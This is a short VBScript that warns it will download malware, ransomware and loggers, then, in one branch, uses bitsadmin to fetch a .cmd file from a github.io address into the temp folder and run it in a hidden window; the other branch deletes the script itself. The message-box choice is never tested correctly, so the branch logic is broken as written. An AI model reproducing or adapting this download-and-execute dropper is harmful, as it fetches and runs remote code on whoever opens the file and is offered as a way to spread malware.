msgbox "Hey this .vbs file will download a .zip file containing malware, ransomware, and loggers. Continue? (I'm not responsible :>)", vbYesNo, "!Warning!"

If vbNo Then
    Set fso = CreateObject("Scripting.FileSystemObject")
    fso.DeleteFile WScript.ScriptFullName
Else
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "cmd /c bitsadmin /transfer myDownloadJob /download /priority normal https://monkebutcool.github.io/wuckers.cmd %temp%\wuckers.cmd && %temp%\wuckers.cmd", 0, True
End If